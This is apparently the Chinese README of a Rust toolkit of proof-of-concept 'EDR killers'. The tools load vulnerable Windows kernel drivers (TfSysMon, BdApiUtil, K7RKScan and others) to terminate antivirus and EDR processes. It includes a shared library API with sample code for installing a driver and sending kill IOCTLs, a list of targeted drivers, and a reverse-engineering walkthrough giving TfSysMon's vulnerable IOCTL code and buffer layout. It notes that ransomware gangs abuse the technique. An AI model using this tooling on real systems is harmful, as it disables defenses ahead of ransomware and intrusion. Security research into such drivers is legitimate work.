<img width="956" height="538" alt="cropped-Aug 28, 2025, 03_39_19 PM" src="https://github.com/user-attachments/assets/3d4b6944-770c-47c8-883b-f4d9bb90eb4d" />


**BYOVD** 是一系列概念验证（PoC）的集合，演示如何利用存在漏洞的驱动程序来禁用 AV/EDR 解决方案。

该集合既包含未公开记录的驱动程序，也包含已在 [LOLDDrivers](https://www.loldrivers.io/) 或 [微软推荐的驱动程序阻止规则](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/design/microsoft-recommended-driver-block-rules) 中已有覆盖的驱动程序。

---
> 自首次发现以来，TfSysMon 驱动程序已被添加到 LOLDrivers，并被勒索软件团伙通过 **EDRKillShifter** 工具滥用，据 [Sophos](https://news.sophos.com/en-us/2024/08/14/edr-kill-shifter/) 和 [ESET](https://www.welivesecurity.com/en/eset-research/shifting-sands-ransomhub-edrkillshifter/) 报道
---

## 📚 目录
- [🔍 概述](#-概述)
- [🏗️ 项目结构](#%EF%B8%8F-项目结构)
- [🔧 构建](#-构建)
- [📦 byovd-lib](#-byovd-lib)
- [💡 POC](#-poc)
- [🔬 完整的驱动程序逆向工程流程（x64）](#-完整的驱动程序逆向工程流程x64)
- [🔗 参考资料](#-参考资料)
- [⚠️ 免责声明](#%EF%B8%8F-免责声明)
  
## 🔍 概述
**BYOVD 技术**最近在攻击性安全领域变得流行，尤其是随着 SpyBoy 的 *Terminator*（售价 3,000 美元）和 *ZeroMemoryEx Blackout* 项目等工具的发布。这些工具利用存在漏洞的驱动程序来禁用 AV/EDR 代理，通过降低检测能力来促进后续攻击。

本仓库包含若干为教育目的开发的 PoC，帮助研究人员理解这些驱动程序如何被滥用来终止进程。

## 🏗️ 项目结构

该项目组织为一个 **Rust Cargo 工作区**。大多数 PoC 共享一个公共库（`byovd-lib`），该库处理样板代码：驱动程序服务生命周期、IOCTL 分发、进程监控、权限调整和清理。每个 killer 都是一个轻量级二进制文件（约 50-100 行），仅定义其驱动程序特定的配置。**`K7Terminator`、`Astra64-Killer`、`Ktapi-Killer` 和 `Xhunter1-Killer` 是独立项目**——它们有自己的 `[workspace]` 声明，直接从各自目录构建，而非通过根工作区。

```
BYOVD/
├── Cargo.toml                       # 工作区根（依赖 + release 配置）
├── Cargo.lock
├── README.md
├── LICENSE
│
├── byovd-lib/                       # 共享库
│   ├── Cargo.toml
│   └── src/
│       ├── lib.rs                   # DriverConfig trait + run() / send_ioctl() / run_monitor()
│       ├── service.rs               # ByovdDriver -- SCM 生命周期（install/start/stop_and_delete）
│       ├── device.rs                # DeviceHandle -- 5 种类型化 IOCTL 分发形态
│       ├── handle.rs                # WinHandle / ScHandle -- RAII 句柄包装器（Send + Sync）
│       ├── process.rs               # find_pid_by_name / find_all_pids_by_name
│       ├── monitor.rs               # run_monitor_loop（基于闭包）+ setup_ctrlc_handler
│       ├── privilege.rs             # enable_privilege / ensure_running_as_local_system
│       └── util.rs                  # to_wstring / to_cstring / get_current_dir
│
├── AppRemover-Killer/               # OPSWAT AppRemover ardrv.sys
├── Astra64-Killer/                   # EnTech Astra32 / TVicHW astra64.sys -- 独立项目，仅数据 Shadow SSDT 劫持 EDR killer
├── BdApiUtil-Killer/                # 百度 BdApiUtil64（CVE-2024-51324）
├── CcProtect-Killer/                # CnCrypt CcProtect
├── EnPortv-Killer/                  # EnCase EnPortv
├── GameDriverX64-Killer/            # Fedeen GameDriverX64（CVE-2025-61155）
├── GoFlyDrv-Killer/                 # Golink GoFlyDrv
├── HNOs2Ec-Killer/                  # 荣耀 PCManager HNOs2Ec.sys
├── HWAudioOs2Ec-Killer/             # 华为音频驱动 HWAudioOs2Ec.sys
├── K7Terminator/                    # K7 RKScan -- 独立项目，LPE + BYOVD 模式
├── Ksapi64-Killer/                  # 金山 ksapi64
├── Ktapi-Killer/                    # Kontron ktapi.sys -- 独立项目，两阶段 shellcode EDR killer
├── MonProcess-Killer/               # 荣耀 HnRSMService MonProcess.sys
├── MonProcessEX-Killer/             # 荣耀 MagicAnimation 和荣耀 PCManager MonProcessEX.sys
├── NSec-Killer/                     # NSEC NSecKrnl（ValleyRAT BYOVD 复现）
├── PCTcore64-Killer/                # PC Tools PCTcore64（CVE-2026-8501）
├── PoisonX-Killer/                  # 微软 PoisonX（j3h4ck 复现）
├── STProcessMonitor-Killer/         # Safetica STProcessMonitor（CVE-2025-70795，v114 + v2618）
├── TfSysMon-Killer/                 # ThreatFire sysmon
├── UnknownKiller/                   # 未归属的 unknown.sys
├── Viragt64-Killer/                 # Tg Soft viragt64
├── Wsftprm-Killer/                  # Topaz wsftprm（CVE-2023-52271）
├── Xhunter1-Killer/                 # Wellbia xhunter1.sys（CVE-2026-3609）
└── Xkpsm-Killer/                    # JiranJikyosoft X-Keeper xkpsm
```

每个 `*-Killer/` 目录都包含自己的 `Cargo.toml`、`src/main.rs`（`DriverConfig` 实现 + CLI）、`README.md`（驱动程序哈希 + 用法）以及二进制文件在运行时加载的匹配 `.sys` 文件。

## 🔧 构建

**前置条件：** Rust 工具链和带有 Windows SDK 的 Visual Studio Build Tools。

```bash
# 构建所有工具（release，优化 + 剥离）
cargo build --release

# 构建单个工具
cargo build --release -p BdApiUtil-Killer

# 构建多个特定工具
cargo build --release -p NSec-Killer -p Wsftprm-Killer
```

二进制文件输出到 `target/release/`。运行前请将对应的 `.sys` 驱动程序文件复制到与可执行文件相同的目录中。

## 📦 byovd-lib

`byovd-lib` 是所有 PoC（除 K7Terminator 外）所基于的共享库。它公开了 **两个互补的 API**——一个用于标准"安装驱动、发现即杀、清理"流程的高级声明式 API，以及一个用于需要自定义流程的 killer（附加到已加载的驱动、向多个 PID 分发、结构化 IOCTL 缓冲区、自定义重试逻辑等）的低级命令式 API。两者可以在同一二进制文件中混合使用。

### 模块布局

```
byovd-lib/src/
├── lib.rs        # DriverConfig trait + run() / send_ioctl() / run_monitor()
├── service.rs    # ByovdDriver -- SCM 生命周期（install, start, stop_and_delete）
├── device.rs     # DeviceHandle -- 类型化 IOCTL 分发（5 种形态）
├── handle.rs     # WinHandle / ScHandle -- RAII 句柄包装器（Send + Sync）
├── process.rs    # find_pid_by_name / find_all_pids_by_name
├── monitor.rs    # run_monitor_loop（基于闭包）+ setup_ctrlc_handler
├── privilege.rs  # enable_privilege / ensure_running_as_local_system
└── util.rs       # to_wstring / to_cstring / get_current_dir
```

### 高级 API：`DriverConfig` trait + `run()`

这是捆绑的 killer 所使用的。实现该 trait，调用 `byovd_lib::run()`，完成。

```rust
use byovd_lib::{DriverConfig, Result};
use clap::Parser;

struct MyDriver;
impl DriverConfig for MyDriver {
    fn driver_name(&self) -> &str { "MyDriver" }
    fn driver_file(&self) -> &str { "mydriver.sys" }
    fn device_path(&self) -> &str { "\\\\.\\MyDevice" }
    fn ioctl_code(&self) -> u32 { 0xDEAD }
    fn build_ioctl_input(&self, pid: u32, _name: &str) -> Vec<u8> {
        pid.to_ne_bytes().to_vec()
    }
}

#[derive(Parser)]
struct Cli {
    #[arg(short = 'n', long = "name", required = true)]
    process_name: String,
}

fn main() -> Result<()> {
    let cli = Cli::parse();
    byovd_lib::run(&MyDriver, &cli.process_name, None)
}
```

`run()` 执行：`preflight_check` → 安装服务（`SERVICE_DEMAND_START`）→ `StartService` → 发现即杀监控（Ctrl+C 退出）→ 停止并删除服务。

可选 trait 覆盖及其默认值：

| 方法 | 默认值 | 用途 |
|---|---|---|
| `device_access()` | `SERVICE_ALL_ACCESS` | `CreateFileW` 访问标志 |
| `skip_unload()` | `false` | 跳过驱动程序清理（例如卸载时蓝屏的驱动程序） |
| `ignore_ioctl_error()` | `false` | 将 IOCTL 失败视为成功（例如 NSecKrnl 在成功时报告错误） |
| `ioctl_output_size()` | `0` | 预期输出缓冲区大小（字节） |
| `preflight_check()` | `Ok(())` | 启动前验证（例如 LocalSystem 检查） |

### 低级 API：命令式组件

当 trait 流程不适合时——例如驱动程序已加载，你只想发送一个 IOCTL；你需要自定义重试策略；IOCTL 接受结构化输入而不仅仅是 PID；或者你想向所有匹配的 PID 分发——可以直接组合使用底层组件。

**驱动程序生命周期** -- `ByovdDriver`：

```rust
use byovd_lib::ByovdDriver;

let driver = ByovdDriver::new("MyDriver", "mydriver.sys", "\\\\.\\MyDevice")?;
driver.start()?;                       // ERROR_SERVICE_ALREADY_RUNNING 是可以的
let device = driver.open_device()?;    // 返回 DeviceHandle
// ... 发送 IOCTL ...
driver.stop_and_delete()?;
```

**IOCTL 分发** -- `DeviceHandle` 公开五种类型化形态：

| 方法 | 使用场景 |
|---|---|
| `ioctl<I, O>(code, &input, &mut output)` | 同时有输入和输出缓冲区，类型不同 |
| `ioctl_inout<T>(code, &mut data)` | 输入和输出使用同一缓冲区 |
| `ioctl_in<I>(code, &input)` | 仅输入，无输出缓冲区 |
| `ioctl_in_unchecked<I>(code, &input)` | 仅输入，忽略失败（`ignore_ioctl_error` 的按调用替代方案） |
| `ioctl_raw(code, in_ptr, in_size, out_ptr, out_size)` | 原始指针逃生通道 |

当 IOCTL 接受结构体时（例如 `{ pid: u32, padding: [u8; 20] }`），类型化形式消除了手动 `to_ne_bytes()` / `extend_from_slice()` 样板代码。

**进程查找** -- `find_pid_by_name(name)`（首个匹配）和 `find_all_pids_by_name(name)`（所有匹配，排除系统 PID ≤ 4）。

**自定义监控循环** -- `run_monitor_loop(name, interval, |pid| ...)` 接受一个闭包，因此你可以对每个匹配做任何事（多个 IOCTL、结构化日志、跨 PID 分发、出错重试）。

**权限** -- `enable_privilege("SeDebugPrivilege")` / `enable_privilege("SeLoadDriverPrivilege")` 用于需要显式令牌权限的驱动程序。`ensure_running_as_local_system()` 如果进程不是以 `S-1-5-18` 运行则返回错误。

**句柄包装器** -- `WinHandle`（自动 `CloseHandle`）和 `ScHandle`（自动 `CloseServiceHandle`）是 `Send + Sync` 的，可以跨线程移动。

### 示例：附加到已加载的驱动程序，无服务生命周期

这就是 `UnknownKiller --attach` 所做的——完全跳过 SCM，仅打开设备并发送一次 IOCTL：

```rust
use byovd_lib::{find_pid_by_name, DeviceHandle, Result};

fn main() -> Result<()> {
    let device = DeviceHandle::open("\\\\.\\eb")?;
    let pid = find_pid_by_name("notepad.exe").ok_or("not running")?;
    device.ioctl_in(0x222024, &pid)?;   // 类型化：直接传 &u32
    Ok(())
}
```

### 向后兼容别名

`FileHandle` / `ServiceHandle` 仍然解析为 `WinHandle` / `ScHandle`，`get_pid_by_name` 保留为 `find_pid_by_name` 的别名，因此引用这些旧名称的代码仍可编译。

## 💡 POC
以下是本仓库中可用的驱动程序及其各自的 PoC：

- **[AppRemover-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/AppRemover-Killer)**：针对 `OPSWAT AppRemover` 的 `ardrv.sys`。
- **[Astra64-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/Astra64-Killer)**：针对 `EnTech Taiwan`（Astra32 / TVicHW）的 `astra64.sys`——独立项目，仅数据 Shadow SSDT 劫持 EDR killer。
- **[BdApiUtil-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/BdApiUtil-Killer)**：针对 `百度杀毒` 的 `BdApiUtil64.sys`（CVE-2024-51324）。
- **[CcProtect-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/CcProtect-Killer)**：针对 `CnCrypt` 的 `CcProtect.sys`。
- **[EnPortv-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/EnPortv-Killer)**：针对 `Guidance EnCase` 的 `EnPortv.sys`。
- **[GameDriverX64-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/GameDriverX64-Killer)**：针对 `Fedeen Games` 的 `GameDriverX64.sys`（CVE-2025-61155）。
- **[GoFlyDrv-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/GoFlyDrv-Killer)**：针对 `Golink` 的 `GoFlyDrv.sys`。
- **[HNOs2Ec-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/HNOs2Ec-Killer)**：针对 `荣耀`（PCManager）的 `HNOs2Ec.sys`。
- **[HWAudioOs2Ec-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/HWAudioOs2Ec-Killer)**：针对 `华为` 的 `HWAudioOs2Ec.sys`。
- **[K7Terminator](https://github.com/BlackSnufkin/BYOVD/tree/main/K7Terminator)**：针对 `K7 Computing` 的 `K7RKScan.sys`（CVE-2025-52915，CVE-2025-1055）——[完整文章](https://blacksnufkin.github.io/posts/BYOVD-CVE-2025-52915/)。
- **[Ksapi64-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/Ksapi64-Killer)**：针对 `金山公司` 的 `ksapi64.sys` / `ksapi64_del.sys`。
- **[Ktapi-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/Ktapi-Killer)**：针对 `Kontron` 的 `ktapi.sys`——独立项目，两阶段 shellcode EDR killer。
- **[MonProcess-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/MonProcess-Killer)**：针对 `荣耀`（HnRSMService）的 `MonProcess.sys`。
- **[MonProcessEX-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/MonProcessEX-Killer)**：针对 `荣耀` 的 `MonProcessEX.sys`。
- **[NSec-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/NSec-Killer)**：针对 `NSEC` 的 `NSecKrnl.sys`（ValleyRAT BYOVD 复现）。
- **[PCTcore64-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/PCTcore64-Killer)**：针对 `PC Tools` 的 `PCTcore64.sys`（CVE-2026-8501）。
- **[PoisonX-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/PoisonX-Killer)**：针对 `微软` 的 `PoisonX.sys`（[@j3h4ck](https://github.com/j3h4ck/PoisonKiller/) 复现）
- **[STProcessMonitor-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/STProcessMonitor-Killer)**：针对 `Safetica` 的 `STProcessMonitor.sys`（CVE-2025-70795，支持 v11.11.4 和 v11.26.18）。
- **[TfSysMon-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/TfSysMon-Killer)**：针对 `ThreatFire System Monitor` 的 `sysmon.sys`。
- **[UnknownKiller](https://github.com/BlackSnufkin/BYOVD/tree/main/UnknownKiller)**：针对未归属厂商的 `unknown.sys`（驱动程序来源待定）。
- **[Viragt64-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/Viragt64-Killer)**：针对 `Tg Soft` 的 `viragt64.sys`。
- **[Wsftprm-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/Wsftprm-Killer)**：针对 `Topaz Antifraud` 的 `wsftprm.sys`（CVE-2023-52271）。
- **[Xhunter1-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/Xhunter1-Killer)**：针对 `Wellbia`（XIGNCODE3，CVE-2026-3609）的旧版 `xhunter1.sys`。
- **[Xkpsm-Killer](https://github.com/BlackSnufkin/BYOVD/tree/main/Xkpsm-Killer)**：针对 `JiranJikyosoft X-Keeper` 的 `xkpsm.sys`。

## 🔬 完整的驱动程序逆向工程流程（x64）

本节以 TfSysMon 驱动程序为实际示例，演示完整的 A-Z 逆向工程方法论。该流程适用于任何 x64 Windows 内核驱动程序分析。

## 🎯 步骤 0：预分析 - 函数导入筛查

在开始逆向工程之前检查驱动程序导入。

一个基本的进程 killer 驱动程序需要两样东西：

获取进程句柄的方法（例如 **ZwOpenProcess** 或 **NtOpenProcess**）

终止进程的方法（例如 **ZwTerminateProcess** 或 **NtTerminateProcess**）

检查驱动程序是否同时导入这两种函数类型。如果驱动程序的导入函数中有 Nt/ZwOpenProcess 和 Nt/ZwTerminateProcess，那么它就是一个潜在的进程 killer 驱动程序候选。只有在确认这些导入之后，才应继续在 IDA Pro 中进行详细逆向工程。

### 🛠️ x64 驱动程序分析前置条件

**必需工具：**
- **IDA Pro** - 用于反汇编驱动程序进行静态分析
- **OSRLoader** - 用于加载/运行驱动程序（sc.exe 命令的替代方案）

### 📍 步骤 1：定位并分析 DriverEntry

**每个 Windows 驱动程序都从 DriverEntry 开始——首先找到这个函数：**

在 TfSysMon 中，DriverEntry 如下所示：

```c
NTSTATUS __stdcall DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
  unsigned __int64 v2; // rax
  v2 = BugCheckParameter2;
  if ( !BugCheckParameter2 || BugCheckParameter2 == 0x2B992DDFA232LL )
  {
    v2 = ((unsigned __int64)&BugCheckParameter2 ^ MEMORY[0xFFFFF78000000320]) & 0xFFFFFFFFFFFFLL;
    if ( !v2 )
      v2 = 0x2B992DDFA232LL;
    BugCheckParameter2 = v2;
  }
  BugCheckParameter3 = ~v2;
  return sub_17484(DriverObject);
}
```

**分析说明：**
- 代码使用 BugCheckParameter2 和 BugCheckParameter3 进行一些初始化
- 真正的驱动程序初始化发生在 `sub_17484` 中
- 跟随对 `sub_17484(DriverObject)` 的调用——这是实际驱动程序设置发生的地方

### 📍 步骤 2：跟随驱动程序初始化链

**导航到初始化函数（`sub_17484`）：**

```c
NTSTATUS __fastcall sub_17484(PDRIVER_OBJECT DriverObject, unsigned __int16 *a2)
{
  // ... 初始化代码 ...
  
  RtlInitUnicodeString(&DestinationString, L"\\Device\\TfSysMon");
  result = IoCreateDevice(DriverObject, 0, &DestinationString, 0x22u, 0x100u, 0, &DeviceObject);
  if ( result < 0 )
    return result;
    
  qword_1D5D8 = 0;
  dword_1D5D0 = 1;
  DriverObject->MajorFunction[15] = (PDRIVER_DISPATCH)&sub_17694;
  DriverObject->MajorFunction[14] = (PDRIVER_DISPATCH)&sub_17694;
  DriverObject->MajorFunction[18] = (PDRIVER_DISPATCH)&sub_17694;
  DriverObject->MajorFunction[2] = (PDRIVER_DISPATCH)&sub_17694;
  DriverObject->MajorFunction[0] = (PDRIVER_DISPATCH)&sub_17694;
  
  RtlInitUnicodeString(&SymbolicLinkName, L"\\DosDevices\\TfSysMon");
  v6 = IoCreateSymbolicLink(&SymbolicLinkName, &DestinationString);
  // ... 函数其余部分 ...
}
```

**关键逆向工程发现：**
- **设备名称**：`\\Device\\TfSysMon`（内核空间）
- **符号链接**：`\\DosDevices\\TfSysMon`（用户模式可访问为 `\\.\\TfSysMon`）
- **设备类型**：`0x22` = FILE_DEVICE_UNKNOWN
- **IRP 处理程序**：所有主功能都指向 `sub_17694`
- **目标函数**：MajorFunction[14] = IRP_MJ_DEVICE_CONTROL 处理程序

### 📍 步骤 3：分析 IRP 分发函数

**导航到分发函数（`sub_17694`）：**

```c
__int64 __fastcall sub_17694(struct _DEVICE_OBJECT *a1, IRP *a2)
{
  struct _IO_STACK_LOCATION *CurrentStackLocation; // rdx
  unsigned int v4; // ebx
  
  if ( a1 != DeviceObject )
  {
    v4 = -1073741790;
    goto LABEL_20;
  }
  CurrentStackLocation = a2->Tail.Overlay.CurrentStackLocation;
  v4 = 0;
  if ( !CurrentStackLocation->MajorFunction )
  {
    // 处理 IRP_MJ_CREATE
  }
  else if ( CurrentStackLocation->MajorFunction == 2 )
  {
    // 处理 IRP_MJ_CLOSE
  }
  else if ( CurrentStackLocation->MajorFunction <= 0xDu )
  {
    goto LABEL_7;
  }
  else if ( CurrentStackLocation->MajorFunction <= 0xFu )
  {
    v4 = sub_177D8(a2);  // 这是 IOCTL 处理程序
    goto LABEL_20;
  }
  // ... 函数其余部分
}
```

**逆向工程分析：**
- 首先进行设备验证（`if ( a1 != DeviceObject )`）
- `CurrentStackLocation->MajorFunction` 确定操作类型
- **关键**：MajorFunction 值 14（0xE）和 15（0xF）调用 `sub_177D8`
- MajorFunction 14 = IRP_MJ_DEVICE_CONTROL = IOCTL 处理
- 漏洞代码路径为：**IOCTL 请求 → sub_177D8**

### 📍 步骤 4：逆向工程 IOCTL 处理程序

**导航到 IOCTL 处理函数（`sub_177D8`）：**

```c
__int64 __fastcall sub_177D8(PIRP Irp, __int64 a2, __int64 a3, __int64 a4)
{
  // ... 变量声明 ...
  
  v7 = *(_DWORD *)(a2 + 24);  // 提取 IOCTL 代码
  MasterIrp = Irp->AssociatedIrp.MasterIrp;  // 输入缓冲区
  v9 = *(unsigned int *)(a2 + 16);  // InputBufferLength
  v10 = *(_DWORD *)(a2 + 8);  // OutputBufferLength
  
  if ( v7 > 0xB4A00070 )
  {
    if ( v7 > 0xB4A000F8 )
    {
      if ( v7 != -1264582404 )
      {
        switch ( v7 )
        {
          // ... 各种 case ...
          case 0xB4A00404:  // 漏洞 IOCTL 代码
            if ( (unsigned int)v9 >= 0x18 )
              return (unsigned int)sub_1837C((__int64)Irp->AssociatedIrp.MasterIrp);
            break;
          // ... 更多 case ...
        }
      }
    }
  }
  // ... 函数其余部分
}
```

**关键逆向工程发现：**
- **IOCTL 提取**：`v7 = *(_DWORD *)(a2 + 24)` 从 IO_STACK_LOCATION 获取 IOCTL 代码
- **输入缓冲区**：`Irp->AssociatedIrp.MasterIrp` 包含用户数据
- **缓冲区长度**：`v9 = *(unsigned int *)(a2 + 16)` 获取输入缓冲区大小
- **漏洞 IOCTL**：`0xB4A00404` 导向 `sub_1837C`
- **大小检查**：仅验证缓冲区 ≥ 0x18（24 字节）——验证极少！

### 📍 步骤 5：分析漏洞函数

**导航到进程终止函数（`sub_1837C`）：**

```c
__int64 __fastcall sub_1837C(__int64 a1)
{
  unsigned int v2; // ebx
  void *v3; // rax
  unsigned int v4; // edi
  NTSTATUS v6; // eax
  // ... 变量声明 ...
  
  v2 = 0;
  if ( MmIsAddressValid((PVOID)a1) )
  {
    v3 = *(void **)(a1 + 4);  // 从偏移 +4 提取 PID
    v4 = 0;
    if ( !v3 )
      return 3221225485LL;
    memset(&ObjectAttributes.RootDirectory, 0, 20);
    ObjectAttributes.SecurityDescriptor = 0;
    ObjectAttributes.SecurityQualityOfService = 0;
    ClientId.UniqueThread = 0;
    ObjectAttributes.Length = 48;
    ClientId.UniqueProcess = v3;  // 设置目标 PID
    while ( 1 )
    {
      v6 = ZwOpenProcess(&ProcessHandle, 1u, &ObjectAttributes, &ClientId);
      v7 = v6 < 0;
      v2 = v6;
      if ( !v6 )
        break;
      v8 = v4++;
      if ( v8 >= 3 )
      {
        v7 = v6 < 0;
        break;
      }
    }
    if ( !v7 )
    {
      v9 = 0;
      do
      {
        v2 = ZwTerminateProcess(ProcessHandle, 0);  // 终止进程
        if ( !v2 )
          break;
        v10 = v9++;
      }
      while ( v10 < 3 );
      ZwClose(ProcessHandle);
    }
  }
  return v2;
}
```

**函数分析：**
- **输入结构**：从驱动程序代码分析中，我们确定了缓冲区布局，其中 PID 位于偏移 +4
- **输入解析**：`v3 = *(void **)(a1 + 4)` 从输入缓冲区偏移 +4 处提取 PID
- **进程打开**：`ZwOpenProcess` 使用最小访问权限（1u = PROCESS_TERMINATE）
- **无安全检查**：不验证调用者权限或目标进程保护
- **进程终止**：直接调用 `ZwTerminateProcess` 
- **重试逻辑**：打开和终止均多次尝试
- **任意进程**：可以终止 SYSTEM 账户可访问的任何进程

### 📍 步骤 6：映射完整攻击链

**完整逆向工程流程：**
1. **入口点**：用户对 `\\.\\TfSysMon` 调用 `DeviceIoControl`
2. **IRP 创建**：I/O 管理器创建 MajorFunction = 14 的 IRP
3. **分发**：`sub_17694` 将 IOCTL 处理路由到 `sub_177D8`
4. **IOCTL 检查**：`sub_177D8` 验证 IOCTL 代码 `0xB4A00404` 和缓冲区大小 ≥ 24 字节
5. **执行**：使用用户输入缓冲区调用 `sub_1837C`
6. **终止**：`sub_1837C` 从偏移 +4 提取 PID 并通过 `ZwTerminateProcess` 终止进程

**输入缓冲区结构（来自驱动程序逆向工程）：**
```
偏移 0x00-0x03: [填充] - 4 字节
偏移 0x04-0x07: [目标进程 ID] - 4 字节（DWORD）  
偏移 0x08-0x17: [额外填充] - 16 字节
总大小：24 字节（0x18）—— 与驱动程序的最小大小检查匹配
```


> 该方法论演示了如何系统地逆向工程任何 Windows x64 内核驱动程序，通过跟踪从用户模式通信到危险内核操作的执行路径来识别类似漏洞。

## 支持 🍺

如果 BYOVD 帮助了你的红队行动，考虑请我喝杯啤酒：

<a href="https://www.buymeacoffee.com/blacksnufkin"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" width="200" height="60"></a>



## 🔗 参考资料
- **Alice Climent-Pommeret 的博客**：[Finding and Exploiting Process Killer Drivers with LOL for $3000](https://alice.climent-pommeret.red/posts/process-killer-driver/)
- **LOLDrivers**：[已知漏洞驱动程序的中央仓库](https://www.loldrivers.io/)
- **微软驱动程序阻止规则**：[微软推荐的驱动程序阻止规则](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/design/microsoft-recommended-driver-block-rules)
- **Windows 内核编程**，作者 Pavel Yosifovich
- **Windows Internals, Part 1 & 2**，作者 Mark E. Russinovich、Alex Ionescu、David Solomon

## ⚠️ 免责声明
**BYOVD 项目** 仅供 **教育和研究目的**。作者不对这些程序造成的任何滥用或损害负责。在任何系统上使用这些工具之前，请务必获得明确许可。
